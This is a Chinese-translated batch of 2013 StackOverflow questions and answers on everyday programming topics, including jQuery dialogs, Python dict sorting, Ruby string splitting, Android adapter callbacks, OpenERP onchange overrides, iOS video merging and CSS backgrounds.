# StackOverflow 问答 15244000-15244999

# vb.net - 我们如何获得 SQL SERVER 的数据库副本？

> ID：15244002
> 
> 赞同：0
> 
> 时间：2013-03-06T09:55:07.467
> 
> 标签：vb.net, sql-server-2008, ms-access-2007, database-migration, vb6-migration

我一直在 VB6 到 VB.NET 迁移项目中工作。在 VB6 项目中，他们为每个用户都有单独的数据库（访问 db .mdb），现在我们将其设置为**集中式数据库**SQL SERVER。在 VB6 中，单独的数据库是一个副本数据库，并且有位于某个位置的 Master-db。现在我们还需要为 SQL SERVER 执行此过程。如何为 SQL Server 等集中式数据库实现此过程？这也适用于每个用户。

任何人都可以对此提供帮助或分享任何链接吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:06:00.147

SQL 数据库被用作单个 .mdf 文件（.log 文件也与它一起，所以 2 个文件）所以一个用户一个文件的简单概念是不合适的（但是它可以实现，即每个用户都有其 SQL 数据库工作分别在他的电脑上）

然后，您将执行逻辑以在检测到机器的空闲时间或其他合适的时间时更新放置在某个服务器上的主数据库

你也可以使用

# javascript - Jquery UI 对话框在初始化之前不能调用对话框上的方法；试图调用方法“isOpen”

> ID：15244003
> 
> 赞同：2
> 
> 时间：2013-03-06T09:55:17.040
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-dialog

我使用我的代码如下。如果对话框已经打开，则函数 get_devcies_full 将被调用 5 次不要再次打开它，只需更新内容然后我将编码 Bellow 我在 javascript 中遇到错误

> 无法在初始化之前调用对话框上的方法；试图调用方法**isOpen**

```
function get_devcies_full(id,slno)
{
    $.post("user/get_full_device/" +id + "/" +slno,
        function(data) {
            var NewDialog = $('<div id="MenuDialog"></div>');
            if (NewDialog.dialog( "isOpen" )!==true){
                NewDialog.dialog({
                    modal: true,
                    title: "Title",
                    width :940,
                    height:600,
                }); 
            }
            NewDialog.html(data);
            var t = setTimeout(function () {get_devcies_full(id,slno);},5000);
        }
    );
} 
```

请给出我遇到问题的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:00:35.357

尝试这个：

```
function get_devcies_full(id,slno)
{
    $.post("user/get_full_device/" +id + "/" +slno,
        function(data) {
            if(!($("#MenuDialog").length))//if this div created for first time
            {
                $(body).append('<div id="MenuDialog"></div>');//First time you have to append this in body  
            }
            if (!$('#MenuDialog').dialog('isOpen'))
            //Try if not works => if(!($("#MenuDialog").parents(".ui-dialog").is(":visible")))
            {
                $("#MenuDialog").dialog({
                    modal: true,
                    title: "Title",
                    width :940,
                    height:600    
                });
            }
            $("#MenuDialog").html(data);
            var t = setTimeout(function () {get_devcies_full(id,slno);},5000);
        }
    );
} 
```

# debugging - cakephp 调试状态

> ID：15244006
> 
> 赞同：-1
> 
> 时间：2013-03-06T09:55:27.180
> 
> 标签：debugging, cakephp

我想返回控制器中的当前调试级别。当整个应用程序处于调试模式时，它的目标是回显特定消息。如果不在调试模式下，它不应该给出消息。

蛋糕 2.x

谢谢托马斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T09:57:40.623

您是否尝试过使用 debug() 函数？

[http://book.cakephp.org/2.0/en/development/debugging.html](http://book.cakephp.org/2.0/en/development/debugging.html)

例如

```
debug("Some String"); 
```

或者

```
debug($myArray); 
```

这将打印调试信息，但仅在调试模式下（级别 > 0）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T12:52:45.783

您可以通过 'Configure::read()' 读取所有 'Config' 参数的值，*包括*'debug' 的当前值；文档可以在这里找到：http: [//book.cakephp.org/2.0/en/development/configuration.html#configure-class](http://book.cakephp.org/2.0/en/development/configuration.html#configure-class)

您可以使用此输出自定义消息；

```
if (Configure::read('debug')) {
    echo '<h1>Your site is running in debug-mode</h1>';
    echo '<p>debug level: ' . Configure::read('debug') . '</p>';
} 
```

如果您只需要输出通用的“调试”消息，`debug('mymessage')`请按照@cowls 的建议使用

# android - 安卓屏幕录像机代码示例

> ID：15244009
> 
> 赞同：1
> 
> 时间：2013-03-06T09:55:44.083
> 
> 标签：android, video, record, video-capture

我想将当前屏幕录制为视频文件。

任何人都可以帮助我如何使用我的 android 应用程序或 android 代码将 android 设备屏幕录制为视频。

# android - 从 (List)Adapter 回调到 Activity

> ID：15244012
> 
> 赞同：0
> 
> 时间：2013-03-06T09:55:46.120
> 
> 标签：android

我有一个带有 ListView 的活动，我设置了一个适配器

```
MyAdapter extends BaseAdapter 
```

该适配器有一个回调接口

```
OnPdfClickedListener callback; 

public interface OnPdfClickedListener {
    public void onPdfClicked();

} 
```

并在活动中

```
MyActvivity implements MyAdapter.OnPdfClickedListener 
```

和

```
@Override
    public void onPdfClicked() {

    Log.d("TEST", "PDF CLICKED in ACTVIIVTY");

} 
```

[这与此处](http://developer.android.com/training/basics/fragments/communicating.html)描述的几乎相同，它就像片段的魅力一样。当从适配器尝试相同时，回调对象为空。

我也尝试过像

```
OnPdfClickedListener callback = new OnPdfClickedListener() {

    @Override
    public void onPdfClicked() {
        // TODO Auto-generated method stub

    }
}; 
```

那时我没有错误，但从未调用过 Activity 中的相应方法。

我的问题是1.为什么在片段中使用回调对象时不是null，它从未实例化

和 2\. 如何从适配器回调 Activity？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:07:36.220

> 1.  为什么在片段中使用时回调对象不是null，它从未实例化

您`Activity`很可能没有注册为侦听器，`callback`您创建的变量（与 无关）是事件发生时的`Activity`一个实例，并且（可能）使用了它。`OnPdfClickedListener`

> 如何从适配器回调 Activity？

将引用传递`Activity`给您的`MyAdapter`类，将其转换为`OnPdfClickedListener`并使用它来调用`onPdfClicked`而不是当前`callback`变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:10:55.237

尝试添加这个：

在实现接口的 Activity 中：

```
new MyAdapter(this,....); 
```

在您的适配器中：

```
MyAdapter(Context context, ...){
  callback = (OnPdfClickedListener)context;
} 
```

# wolfram-mathematica - Mathematica 中切割库存的变体

> ID：15244013
> 
> 赞同：0
> 
> 时间：2013-03-06T09:55:48.650
> 
> 标签：wolfram-mathematica

所以我对 Mathematica 还是很陌生，并且正在尝试学习以一种实用的方式解决问题。我正在解决的问题是列出我可以对列表中的元素求和的方式（重复），所以总和是某个值的 leq。下面的代码很好地解决了这个问题。

```
i = {7.25, 7.75, 15, 19, 22};
m = 22;
getSum[l_List, n_List] := Total[Thread[{l, n}] /. {x_, y_} -> x y];
t = Prepend[Map[Range[0, Floor[m/#]] &, i], List];
Outer @@ %;
Flatten[%, ArrayDepth[%] - 2];
Map[{#, getSum[i, #]} &, %];
DeleteCases[%, {_, x_} /; x > m || x == 0];
TableForm[Flatten /@ SortBy[%, Last], 0, 
 TableHeadings -> {None, Append[i, "Total"]}] 
```

但是，代码检查了很多不必要的情况，如果 m 越高，列表越长，这可能是一个问题。我的问题只是关于效率和代码优雅性，解决这个问题的最数学式的方法是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:28:34.110

一种简单但不是最佳的方法是：

```
sol = Reduce[Dot[i, {a, b, c, d, e}] <= m, {a, b, c, d, e}, Integers]; 
```

首先尝试使用较小的`i`，说`i = {7.25, 7.75}`一下是否可以使用它。

您可以通过为系数提供上限来提高速度，例如

```
sol = Reduce[And @@ {Dot[i, {a, b, c, d, e}] <= m, 
                     Sequence @@ Thread[{a, b, c, d, e} <= Quotient[m, i]]}, 
        {a, b, c, d, e}, Integers] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T18:47:11.333

怎么样

```
recurr[numbers_, boundary_] :=

  Reap[memoryRecurr[0, {}, numbers, boundary]][[2, 1]];

memoryRecurr[_, _, {}, _] := Null;

memoryRecurr[sum_, numbers_, restNumbers_, diff_] :=
  (
   Block[
     {presentNumber = First[restNumbers], restRest = Rest[restNumbers]}
     ,
     If[
      presentNumber <= diff
      ,
      Block[{
        newNumbers = Append[numbers, presentNumber],
        newSum = sum + presentNumber
        },
       Sow[{newNumbers, newSum}];

       memoryRecurr[
        newSum,
        newNumbers,
        restRest,
        diff - presentNumber
        ];
       ]
      ];
     memoryRecurr[sum, numbers, restRest, diff]
     ];

   ); 
```

以便

```
recurr[{1, 2, 3, 4, 5}, 7] 
```

->

```
{{{1}, 1}, {{1, 2}, 3}, {{1, 2, 3}, 6}, {{1, 2, 4}, 7}, {{1, 3}, 
  4}, {{1, 4}, 5}, {{1, 5}, 6}, {{2}, 2}, {{2, 3}, 5}, {{2, 4}, 
  6}, {{2, 5}, 7}, {{3}, 3}, {{3, 4}, 7}, {{4}, 4}, {{5}, 5}} 
```

# python - 正则表达式匹配一系列单个字符，后跟一个空格

> ID：15244016
> 
> 赞同：0
> 
> 时间：2013-03-06T09:55:52.810
> 
> 标签：python, regex, python-2.7

我想使用 python 正则表达式来匹配一系列单个字符，后跟一个空格

示例：“我的名字是 arun 它的 ARUN jayapal。我要去伦敦。”

在这里，正则表达式应该只匹配“ARUN”而不匹配“I”。请帮忙。目前我正在使用以下正则表达式，它只匹配 AU I。

(?:\s[a-zA-Z0-9]\s)+

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:03:35.523

您需要匹配至少*2 个*字符空间组合，但前面有一个单词边界（以确保您的第一个字符不是单词的结尾）：

```
\b(?:[a-zA-Z0-9]\s){2,} 
```

这匹配`A R U N`而不是`I`：

```
>>> re.search(r'\b(?:[a-zA-Z0-9]\s){2,}', 'My name is arun its A R U N jayapal. I am going to London.').group()
'A R U N ' 
```

# ruby - 在 Ruby 中将嵌套数组转换为嵌套哈希

> ID：15244017
> 
> 赞同：2
> 
> 时间：2013-03-06T09:56:00.847
> 
> 标签：ruby, arrays

在不知道数组维度的情况下，如何将数组转换为嵌套哈希？

例如：

```
[["Message", "hello"]] 
```

至：

```
{{:message => "Hello"}} 
```

或者：

```
[["Memory", [["Internal Memory", "32 GB"], ["Card Type", "MicroSD"]]]] 
```

至：

```
{{:memory => {:internal_memroy => "32 GB", :card_type => "MicroSD"}}} 
```

或者：

```
[["Memory", [["Internal Memory", "32 GB"], ["Card Type", "MicroSD"]]], ["Size", [["Width", "12cm"], ["height", "20cm"]]]] 
```

至：

```
{ {:memory => {:internal_memroy => "32 GB", :card_type => "MicroSD"}, {:size => {:width => "12cm", :height => "20cm" } } } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:02:23.677

考虑到嵌套对数组的格式，以下函数将其转换为您想要的哈希

```
def nested_arrays_of_pairs_to_hash(array)
  result = {}
  array.each do |elem|
    second = if elem.last.is_a?(Array)
      nested_arrays_to_hash(elem.last)
    else
      elem.last
    end
    result.merge!({elem.first.to_sym => second})
  end
  result
end 
```

较短的版本

```
def nested_arrays_to_hash(array)
  return array unless array.is_a? Array
  array.inject({}) do |result, (key, value)|
    result.merge!(key.to_sym => nested_arrays_to_hash(value))
  end
end 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-06T10:09:14.163

```
> [:Message => "hello"]
=> [{:Message=>"hello"}] 
```

因此：

```
> [:Message => "hello"][0]
=> {:Message=>"hello"} 
```

# codeigniter - Codeigniter - 动态右键菜单

> ID：15244018
> 
> 赞同：0
> 
> 时间：2013-03-06T09:56:03.443
> 
> 标签：codeigniter

我的 ci 博客站点中有一个正确的菜单，其中包含类别和编号。可能发生变化的帖子的格式如下，

```
Categories:
   Science(24)
   education(32)
    ....
    .... 
```

括号中的数字是该类别中的帖子总数。

我的模板文件在这里：

```
$this->load->view('includes/header');

$this->load->view($main_content);

$this->load->view('includes/footer'); 
```

我的右侧菜单在页脚文件中。我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:11:05.670

您还可以使用此系统来包含页眉/页脚等：

```
<?php

/**
 * /application/core/MY_Loader.php
 *
 */
class MY_Loader extends CI_Loader {
    public function template($template_name, $vars = array(), $return = FALSE)
    {
        $content  = $this->view('templates/header', $vars, $return);
        $content .= $this->view($template_name, $vars, $return);
        $content .= $this->view('templates/footer', $vars, $return);

        if ($return)
        {
            return $content;
        }
    }
} 
```

然后，在您的控制器中，这就是您所要做的：

```
<?php
$this->load->template('body'); 
```

如果来自用户的代码：landons

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:02:56.043

您最好将主视图划分为始终加载的 div(header, main_content,footer,right_menu) 并将每个视图加载到适当的 div 中。

```
<html>
    <body>
        <div id="header">
            <?php $this->load->view('header'); ?>
        </div>
        <div id="body">
            <div id="top_menu">
                <?php $this->load->view('top_menu'); ?>
            </div>
            <div id="main_content">
                <?php $this->load->view('main_content'); ?>
            </div>
        </div>
        <div id="footer">
            <?php $this->load->view('footer'); ?>
        </div>
    </body>
</html> 
```

# java - 如何读取/导出从 JAVA 中的 SQL 服务器输出的 XML 文件

> ID：15244019
> 
> 赞同：1
> 
> 时间：2013-03-06T09:56:07.303
> 
> 标签：java, sql-server, xml-parsing, sqlxml

我有一个查询，我在**SQL server 2005/2008**`XML`中执行，以格式给我输出。

这是生成 xml 输出的示例查询：

```
SELECT 
    (SELECT 'White' AS Color1,
            'Blue' AS Color2,
            'Black' AS Color3,
            'Light' AS 'Color4/@Special',
            'Green' AS Color4,
            'Red' AS Color5 
    FOR XML PATH('Colors'),TYPE),
    (SELECT 'Apple' AS Fruits1,
            'Pineapple' AS Fruits2,
            'Grapes' AS Fruits3,
            'Melon' AS Fruits4 
    FOR XML PATH('Fruits'),TYPE) 
FOR XML PATH(''),ROOT('SampleXML') 
```

我需要的是，读取**Java**中的输出以将其转换为`java.io.File`格式，这样我就可以解析和填充对象。

我试过了：`SQLXML sqlxml = resultSet.getSQLXML(column);`，[这里给出](http://docs.oracle.com/javase/6/docs/api/java/sql/SQLXML.html)

但它抛出了一个异常：`Exception in thread "main" java.lang.AbstractMethodError: com.inet.pool.g.getSQLXML(I)Ljava/sql/SQLXML;`

请建议我一种读取文件的方法。

**请注意：**我可以将 o/p 读取为`String`using `resultSet.getString(column)`，但无法解析它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:47:45.857

[SQLXML 接口](http://docs.oracle.com/javase/8/docs/api/java/sql/SQLXML.html)提供了以 String、Reader 或 Writer 或 Stream 的形式访问 XML 值的方法。将 sqlxml 放入二进制流并解析 xml

```
SQLXML sqlxml = resultSet.getSQLXML(column);
InputStream binaryStream = sqlxml.getBinaryStream(); 
```

# python - 按 dict.values 的数值对 dict 进行排序

> ID：15244022
> 
> 赞同：5
> 
> 时间：2013-03-06T09:56:16.860
> 
> 标签：python, sorting, dictionary

我有一个 dict `d = {'a': '1', 'c': '10', 'b': '8', 'e': '11', 'g': '3', 'f': '2'}`。我想用数值对字典进行排序`d.values()`。必需的答案是`['a','f', 'g', 'b', 'c', 'e']`。我在[这里](https://stackoverflow.com/questions/613183/python-sort-a-dictionary-by-value)检查过。我无法根据 d.values() 的整数值对其进行排序。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-06T09:58:49.490

```
>>> d = {'a': '1', 'c': '10', 'b': '8', 'e': '11', 'g': '3', 'f': '2'}
>>> sorted(d, key=lambda i: int(d[i]))
['a', 'f', 'g', 'b', 'c', 'e'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:00:37.500

那是因为字典中的值是 type `string`：注意数字周围的引号。尝试将您的字典设置为：

```
d = {'a':1, 'c':10, 'b':8, 'e':11, 'g':3, 'f':2} 
```

# ruby - 在行尾拆分字符串（Ruby）

> ID：15244026
> 
> 赞同：0
> 
> 时间：2013-03-06T09:56:18.560
> 
> 标签：ruby, regex, string, split

我很难将此字符串转换为将每行作为一个元素的数组。

```
string =
"03 54 56 34 34
34 54 56 43 34 56
43 56 67 34 34" 
```

我试过了`string_array= [string.split(/$/)]`。但是，`string_array`then 只包含一个元素（整个字符串）。我错过了什么？

旁注：字符串中的各个数字由一个空格分隔，但是，一行的每一端都不包含空格。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:38:54.323

您也可以使用方法`lines`：

```
string.lines.to_a # => ["03 54 56 34 34\n", "34 54 56 43 34 56\n", "43 56 67 34 34"] 
```

而且，您还可以使用`chomp`希望删除换行符：

```
string.lines.map(&:chomp) # => ["03 54 56 34 34", "34 54 56 43 34 56", "43 56 67 34 34"] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T09:58:04.450

`string_array = string.split(/\n/)`应该做的工作。

# mysql - 如何将 django 项目（考勤系统）上传到 centOS 服务器

> ID：15244027
> 
> 赞同：0
> 
> 时间：2013-03-06T09:56:18.910
> 
> 标签：mysql, django, web-services, centos

我刚刚开始接触 django 和 linux 服务器，所以还是新手。我的问题是我有一个 django 项目，它是一个考勤系统，我想将它上传到我的服务器，我正在使用 CentOS6。我想要它，以便其他用户也可以使用它并登录它。我完全不知道首先要做什么以及要注意什么等等。我完全迷路了。谁能帮助我一步一步地帮助我存档。请询问您是否需要有关任何内容的更多信息。

提前谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:45.643

希望有人对如何将 Django 安装到 CentOs 服务器进行了逐步说明**：**

[http://itekblog.com/installing-python-django-on-centos-6-3-is-easy/](http://itekblog.com/installing-python-django-on-centos-6-3-is-easy/)

在生产中部署 Web 应用程序是一项**关键任务**。如果您不了解 Linux，则需要系统管理员的帮助才能**准确了解您在做什么**。

# java - 如何动态创建 SWT 按钮及其操作？

> ID：15244030
> 
> 赞同：2
> 
> 时间：2013-03-06T09:56:24.233
> 
> 标签：java, swt

我创建了一个确定按钮（按钮）。

根据用户输入，我想动态创建 1 到 10 个 SWT 按钮（复选框）。

如何创建它？

如果单击确定按钮，如何显示已选中的所有复选框按钮？

请在下面找到我正在尝试的片段：

```
Set<String> Groups = getData(Contents);
for(String group : contentGroups) {

contentButton = new Button(fComposite, SWT.CHECK);  

    // is this right way to create dynamic buttons?

    contentButton.setText(group);

}

okButton = new Button(lowComposite, SWT.PUSH);

okButton.addSelectionListener(new SelectionListener(){

    @Override
    public void widgetSelected(SelectionEvent e){

        //Here how to get the selection status of contentButtons?       
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T11:09:07.010

这将打印出按钮的选择状态：

```
Set<String> Groups = getData(Contents);

final List<Button> buttons = new ArrayList<Button>();

for(String group : contentGroups)
{
    Button newButton = new Button(fComposite, SWT.CHECK);  
    newButton.setText(group);

    // save the button
    buttons.add(newButton);
}

Button okButton = new Button(lowComposite, SWT.PUSH);

okButton.addListener(SWT.Selection, new Listener()
{
    @Override
    public void handleEvent(Event e)
    {
        // iterate over saved buttons
        for(Button button : buttons)
        {
            System.out.println(button.getText() + ": " + button.getSelection());
        }       
    }
} 
```

# openerp - openerp 覆盖 onchange 行为而不影响基础

> ID：15244031
> 
> 赞同：2
> 
> 时间：2013-03-06T09:56:25.340
> 
> 标签：openerp

我继承自 purchase.order.line。我添加了一堆相关字段。它们都通过 order_line 中的 product_id 与 product.product 中的字段相关。

我想要实现的是，当用户在采购订单行表单中选择或更改产品时，相关字段应该被刷新/更新/填充所选产品的值。

我已经为此编写了 onchange 方法，但我不确定如何从继承的视图中调用它？product_id 字段已经在（父） order_line 视图中，并且已经定义了 onchange。如何让系统也使用我的 onchange？

我不想打扰 purchase.order.line 中已经存在的 onchange_productid 方法。因此，无论是在我的 onchange 之前还是之后，它都应该继续其标准功能。

谢谢

**编辑**：最新版本（当任何相关的 many2one 或选择字段有值时出现错误）。

```
class purchase_order_line_custom(osv.osv):
    _name = 'purchase.order.line'
    _inherit = 'purchase.order.line'

    def onchange_product_id(self, cr, uid, ids, pricelist_id, product_id, qty, uom_id, partner_id, date_order=False, fiscal_position_id=False, date_planned=False, name=False, price_unit=False, context=None):
    values = super(purchase_order_line_custom, self).onchange_product_id(cr, uid, ids, pricelist_id, product_id, qty, uom_id, partner_id, date_order, fiscal_position_id, date_planned,name, price_unit, context=context)
    if product_id:
        product = self.pool.get('product.product').browse(cr, uid, product_id, context=context)
        values['value'].update({
                                'qualified_name':product.qualified_name,
                                'product_type' : product.product_type or None,
                                'product_subtype' : product.product_subtype,
                                'count_id':product.count_id or None 
        })
    return values   

_columns={
          'product_type': fields.related('product_id','product_type',type='selection', string='Product Type', selection=[('X','X'),('Y','Y'),('Z','Z')]),
          'product_subtype': fields.related('product_id','product_subtype',type='char', size=64, string='Sub-Type'),
          'qualified_name': fields.related('product_id','qualified_name',type='char', size=64, string='Qualified Name'),
          'count_id': fields.related('product_id','count_id',type='many2one',relation='product.mycount',string='Count')
          }

purchase_order_line_custom() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:05:18.657

您需要覆盖字段“product_id”的 onchange 函数（您可以使用 super() ）并更新结果。例如

```
def onchange_product(self,cr,uid,ids,product_id,context=None):
    values = super(<your_class_name>,self).onchange_product(cr, uid,ids,product_id,context=context)
    # values will be a dictionary containing 'value' as a key.
    # You need to add all the newly added related fields and other fields to the values['value']. 
    # if 'aaa' is the newly added field, then values['value'].update({'aaa':<value for aaa>})
    # then return values
    return values 
```

修改你onchange到以下

```
def onchange_product_id(self, cr, uid, ids, pricelist_id, product_id, qty, uom_id,
    partner_id, date_order=False, fiscal_position_id=False, date_planned=False,
    name=False, price_unit=False, context=None):
    values = super(purchase_order_line_custom, self).onchange_product_id(cr, uid, ids, pricelist_id, product_id, qty, uom_id, partner_id, date_order, fiscal_position_id, date_planned,name, price_unit, context=context)
    if product_id:
        product = self.pool.get('product.product').browse(cr, uid, product_id, context=context)
        values['value'].update({
            'product_type' : product.product_type,
            'product_subtype' : product.product_subtype,
            'qualified_name' : product.qualified_name,
            'count_id' : product.count_id                 
        })
    return values 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:12:42.660

首先让我们了解为什么`fields.related`使用？

`fields.related`指向当前记录的另一个字段中的某些数据的字段。

这意味着，当您选择其他字段的值时，将自动填充相关的字段。

例子：

```
 _columns = {
       'product_id': fields.many2one('product.product', 'Product'),
       'product_name': fields.related('product_id', 'name', type='char', string='Product Name'),
    } 
```

在此示例`product_name`中，当您选择 时将自动填充`product_id`。你不必为此写作`onchange`。

你可以找到很多例子`fields.related`。

# ios - 如何仅在非越狱设备（iPhone / iPad）中安装应用程序，但不在越狱设备中安装应用程序

> ID：15244037
> 
> 赞同：2
> 
> 时间：2013-03-06T09:56:40.790
> 
> 标签：ios, objective-c, xcode

我的要求是用户只想在非越狱设备中安装应用程序。如果设备（iPhone/i Pad）越狱，它无法安装在设备中。我不知道该怎么做?

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T09:58:46.360

这是不可能的。你做不到。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T09:59:40.723

您无法避免安装，但您可以阻止应用程序在越狱设备中运行，请参阅[this other question](https://stackoverflow.com/questions/6530364/how-to-detect-that-the-app-is-running-on-a-jailbroken-device)和接受的答案。

# ruby-on-rails - 如何匹配渲染 :status => 412, :error => "Invalid App Key"

> ID：15244039
> 
> 赞同：0
> 
> 时间：2013-03-06T09:56:42.110
> 
> 标签：ruby-on-rails, rspec

```
if !@app_key
   # throw error here for unknown app
   Rails.logger.error { "Invalid APP Key provided #{app_key}" }
   render :status => 412, :error => "Invalid App Key", :nothing => true
end 
```

如何匹配渲染 :status => 412, :error => "Invalid App Key"

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T12:58:08.450

尝试这样的事情：

```
response.status.should eq(412)
flash[:error].should eq("Invalid App Key") 
```

# iphone - 如何在 iphone sdk 中合并实时流媒体视频和音频

> ID：15244041
> 
> 赞同：2
> 
> 时间：2013-03-06T09:56:48.497
> 
> 标签：iphone, ios, avmutablecomposition

我正在 IOS 中开发基于视频的应用程序。在我的应用程序中，我需要合并视频和音频。我已经合并了本地视频和音频文件，但是如果我尝试合并它们，我无法合并实时流视频和音频，这意味着应用程序由于持续时间而崩溃。对于合并我使用下面的代码

```
 -(void) playerFunction
    {
             NSURL *url = [NSURL URLWithString:@"http://www.digdang.com/media/VideoFolde/017141.mp4"];

//    NSURL *url = [NSURL URLWithString:@"http://www.educator.com:1935/mobile/mp4:testVideo.mp4/playlist.m3u8"];// these is totally not working

    NSString* audio_inputFileName = @"audio.mp3";
    NSString* audio_inputFilePath = [NSString stringWithFormat:@"%@/%@",[[NSBundle mainBundle] resourcePath],audio_inputFileName];
    NSURL*    audiopath = [NSURL fileURLWithPath:audio_inputFilePath];

    NSString* videoName = @"output.mov";//outputdata
    NSString *savepath = [NSTemporaryDirectory() stringByAppendingPathComponent:videoName];

    NSFileManager *filemgr = [NSFileManager defaultManager];

    if ([filemgr fileExistsAtPath:savepath ] == YES){
        [[NSFileManager defaultManager] removeItemAtPath:savepath error:nil];
    }
    else
    {
        NSLog (@"File not found");
    }
    CMTime nextClipStartTime = kCMTimeZero;

    AVMutableComposition* mixComposition = [AVMutableComposition composition];
    NSDictionary *options = @{ AVURLAssetPreferPreciseDurationAndTimingKey : @YES };
    AVURLAsset* videoAsset = [[AVURLAsset alloc]initWithURL:url options:options];
    AVURLAsset* audioAsset = [[AVURLAsset alloc]initWithURL: audiopath options:options];
    CMTimeRange video_timeRange = CMTimeRangeMake(kCMTimeZero,videoAsset.duration);
    AVMutableCompositionTrack *a_compositionVideoTrack = [mixComposition addMutableTrackWithMediaType:AVMediaTypeVideo preferredTrackID:kCMPersistentTrackID_Invalid];
    NSLog(@"%@",[videoAsset tracksWithMediaType:AVMediaTypeVideo]);
    NSLog(@"%@",[audioAsset tracksWithMediaType:AVMediaTypeAudio]);
    NSLog(@"%f", CMTimeGetSeconds(videoAsset.duration));
    [a_compositionVideoTrack insertTimeRange:video_timeRange ofTrack:[[videoAsset tracksWithMediaType:AVMediaTypeVideo] objectAtIndex:0] atTime:kCMTimeZero error:nil];
    [a_compositionVideoTrack scaleTimeRange:video_timeRange toDuration:audioAsset.duration];

    CMTimeRange audio_timeRange = CMTimeRangeMake(kCMTimeZero, audioAsset.duration);
    AVMutableCompositionTrack *b_compositionAudioTrack = [mixComposition addMutableTrackWithMediaType:AVMediaTypeAudio preferredTrackID:kCMPersistentTrackID_Invalid];
    [b_compositionAudioTrack insertTimeRange:audio_timeRange ofTrack:[[audioAsset tracksWithMediaType:AVMediaTypeAudio] objectAtIndex:0] atTime:nextClipStartTime error:nil];

    AVAssetExportSession* _assetExport = [[AVAssetExportSession alloc] initWithAsset:mixComposition presetName:AVAssetExportPresetLowQuality];
    _assetExport.shouldOptimizeForNetworkUse = YES;
    _assetExport.outputFileType = @"com.apple.quicktime-movie";

    NSURL    *savetUrl = [NSURL fileURLWithPath:savepath];

    _assetExport.outputURL = savetUrl;
    _assetExport.timeRange = CMTimeRangeMake(kCMTimeZero, audioAsset.duration);

    [_assetExport exportAsynchronouslyWithCompletionHandler:
     ^(void ) {
         switch (_assetExport.status)
         {
             case AVAssetExportSessionStatusCompleted:
                 //   export complete

                 NSLog(@"Export Complete");
                 //------>>> // From Here I want play movie using MPMoviePlayerController.<<<---------
                 [self play];
//                 [self performSelector:@selector(play) withObject:nil afterDelay:2.0];
                 break;
             case AVAssetExportSessionStatusFailed:
                 NSLog(@"Export Failed");
                 NSLog(@"ExportSessionError: %@", [_assetExport.error localizedDescription]);

                 //                export error (see exportSession.error)
                 break;
             case AVAssetExportSessionStatusCancelled:
                 NSLog(@"Export Failed");
                 NSLog(@"ExportSessionError: %@", [_assetExport.error localizedDescription]);

                 //                export cancelled
                 break;

         }

     }

     ];

    NSLog(@"savepath :%@",savepath);
    } 
```

请一些身体帮助我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T06:42:37.500

您没有提供正确的实时视频 URL 来播放。

在您的代码中，您已经在文档目录中传递了本地视频 URL。 `NSString *fileNamePath1 = @"Egg_break.mov";`而不是这个，你应该从服务器传递一些 URLString。

例如

```
AVURLAsset *asset = [AVURLAsset URLAssetWithURL:[NSURL URLWithString:@"http://qtdevseed.apple.com/addemo/ad.m3u8"] options:nil]; 
```

# css - 使用 Dreamweaver 在 CSS 中设置背景颜色

> ID：15244048
> 
> 赞同：0
> 
> 时间：2013-03-06T09:57:18.013
> 
> 标签：css, dreamweaver

我正在尝试通过在 Dream Weaver CS5 中使用级联样式表为我的网页添加背景。我有幸找到了这段代码：

```
html, body {height: 100%; width: 100%; padding: 0; margin: 0;}

#full-screen-background-image {z-index: -999; min-height: 100%; min-width: 1024px; width: 100%; height: auto; position: fixed; top: 0; left: 0;}

#wrapper {position: relative; width: 800px; min-height: 400px; margin: 100px auto; color: #333;} 
```

哪个被添加到样式表中，这个位：

```
<body>
  <img alt="full screen background image" src="/background.jpg" id="full-screen-background-image" /> 
  <div id="wrapper">
    <p>Content goes here...</p>
  </div>
</body> 
```

它被添加到 HTML 中。

但是，每当我尝试向页面添加另一个元素（例如图像或文本）时，图像就会直接出现在我设置的背景下方，就好像样式表中的代码根本没有设置背景一样。

有人能告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:05:25.753

我认为它实际上工作正常，因为`position:fixed;`将图像从页面流中拉出来。我认为你的罪魁祸首实际上是`margin: 100px auto;`规则`#wrapper`。

我玩了一下你的 CSS 并清理了它。这是期望的结果吗？

[参见 jsFiddle](http://jsfiddle.net/nMzEw/)

```
html, 
body {
    height: 100%; 
    width: 100%; 
    padding: 0; 
    margin: 0;
}

#full-screen-background-image {
    z-index: -999; 
    position: fixed; 
    top: 0; 
    left: 0;
    right: 0;
    bottom: 0;
    background-color:#F00;
}

#wrapper {
    position: relative; 
    width: 800px; 
    /*margin: 100px auto; */
    color: #333;
} 
```

